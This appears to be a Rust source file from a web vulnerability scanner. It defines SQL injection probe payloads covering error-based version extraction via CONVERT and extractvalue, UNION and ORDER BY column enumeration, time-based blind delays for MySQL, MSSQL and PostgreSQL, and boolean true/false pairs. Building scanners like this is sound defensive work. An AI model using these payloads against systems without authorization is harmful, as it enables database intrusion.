use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;

pub fn get_error_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_error_01".into(),
            payload: "'".into(),
            description: "Single quote — triggers SQL syntax error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("SQL syntax".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_02".into(),
            payload: "''".into(),
            description: "Double single-quote — tests escaping".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("syntax error".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_03".into(),
            payload: "' AND 1=CONVERT(int,(SELECT @@version))--".into(),
            description: "MSSQL version extraction via CONVERT error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("nvarchar".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_04".into(),
            payload: "' AND extractvalue(1,concat(0x7e,version()))--".into(),
            description: "MySQL extractvalue error-based extraction".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("XPATH syntax".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_05".into(),
            payload: "1' AND 1=1--".into(),
            description: "Boolean true condition — compare with false".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("error".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_union_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_union_01".into(),
            payload: "' UNION SELECT NULL--".into(),
            description: "Union with 1 column NULL probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "column_count_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_02".into(),
            payload: "' UNION SELECT NULL,NULL--".into(),
            description: "Union with 2 column NULL probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "column_count_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_03".into(),
            payload: "' UNION SELECT NULL,NULL,NULL--".into(),
            description: "Union with 3 column NULL probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "column_count_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_04".into(),
            payload: "' ORDER BY 1--".into(),
            description: "ORDER BY column enumeration start".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "order_by_success".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_time_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_time_01".into(),
            payload: "' AND SLEEP(5)--".into(),
            description: "MySQL time-based blind with SLEEP".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_02".into(),
            payload: "'; WAITFOR DELAY '0:0:5'--".into(),
            description: "MSSQL time-based blind with WAITFOR".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_03".into(),
            payload: "' AND pg_sleep(5)--".into(),
            description: "PostgreSQL time-based blind with pg_sleep".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_boolean_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_bool_01".into(),
            payload: "' AND 1=1--".into(),
            description: "Boolean true condition (should return normal)".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "true_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_02".into(),
            payload: "' AND 1=2--".into(),
            description: "Boolean false condition (should differ from true)".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "false_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}
